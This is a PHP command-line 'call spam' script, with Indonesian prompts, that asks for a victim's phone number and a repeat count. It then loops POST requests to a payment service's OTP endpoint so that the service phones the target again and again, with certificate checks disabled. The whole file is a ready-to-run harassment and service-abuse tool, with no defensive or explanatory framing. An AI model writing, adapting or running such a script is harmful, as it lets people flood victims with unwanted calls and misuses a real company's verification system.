<?php
$asw="
  ___   __   __    __      ____  ____   __   _  _ 
 / __) / _\ (  )  (  )    / ___)(  _ \ / _\ ( \/ )
( (__ /    \/ (_/\/ (_/\  \___ \ ) __//    \/ \/ \
 \___)\_/\_/\____/\____/  (____/(__)  \_/\_/\_)(_/
				Coded By Magic_404
							\n";
							echo $asw;
							echo "Note : 3x Call \n";
							function call($target,$jeda){
								for($x=0;$x<=$jeda;){
									$ch=curl_init();
									curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
								    curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$target."&accept=call");
									curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);
									curl_setopt($ch, CURLOPT_FOLLOWLOCATION,TRUE);
									curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
									curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
									$server_output=curl_exec($ch);
									curl_close($ch);
									$server_output=json_decode($server_output,true);
									$x++;
								}
							}
							echo "Nomer target lu :";
							$target=trim(fgets(STDIN));
							echo"waktu : ";
							$jeda=trim(fgets(STDIN));
							$gas=call($target,$jeda);
							echo"berhasil";
							?>